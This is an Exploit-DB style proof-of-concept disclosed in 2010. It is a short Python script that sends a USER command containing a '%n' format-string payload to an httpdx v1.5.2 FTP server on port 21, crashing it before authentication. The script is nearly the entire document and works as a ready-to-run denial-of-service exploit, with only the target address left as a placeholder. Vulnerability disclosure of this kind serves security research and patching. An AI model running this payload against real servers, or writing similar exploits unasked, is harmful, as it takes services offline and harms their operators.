# Title: httpdx v1.5.2 Remote Pre-Authentication DoS (PoC crash)
# Found by: loneferret
# Hat's off to dookie2000ca
# Discovered on: 06/02/2010
# Software link: http://httpdx.sourceforge.net/downloads/
# Tested on: Windows XP SP3 Professional

# Nod to the Exploit-DB Team

#!/usr/bin/python

import socket

buffer = "\x25\x6e"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('xxx.xxx.xxx.xxx',21)) #Remember to put in the server's address
s.recv(1024)
s.send('USER '+ buffer +'\r\n') #yup, doesn't take much does it.
s.recv(1024) #
s.close() #don't really need these, force of habit